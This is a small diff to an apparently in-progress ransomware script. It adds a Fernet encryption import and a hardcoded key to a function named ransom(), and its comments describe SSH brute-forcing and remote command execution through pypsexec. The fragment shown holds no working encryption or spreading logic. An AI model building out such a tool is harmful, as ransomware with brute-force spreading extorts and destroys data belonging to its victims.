@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-
-import os
+from cryptography.fernet import Fernet #Encrypt files
+import os #Send commands to CMD
 import paramiko #Bruteforcing SSH connection
 import time #Bruteforcing SSH connection
 from pypsexec.client import Client #Sending remote commands
@@ -9,7 +9,7 @@ from pypsexec.client import Client #Sending remote commands
     
 #def encrypt file
 def ransom():
-    os.system()
+    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
 
 #play video
 def playVideo():
